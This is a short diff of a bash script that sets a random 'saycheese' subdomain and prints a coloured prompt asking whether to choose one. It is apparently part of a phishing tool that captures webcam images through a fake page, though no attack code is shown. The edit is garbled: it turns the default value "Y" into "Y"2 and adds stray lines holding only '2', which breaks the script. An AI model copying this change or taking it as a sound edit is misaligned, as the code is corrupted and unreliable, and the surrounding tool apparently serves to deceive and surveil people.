@@ -286,7 +286,9 @@ rm -rf index3.html
 
 start() {
 
-default_choose_sub="Y"
+default_choose_sub="Y"2
+2
+
 default_subdomain="saycheese$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
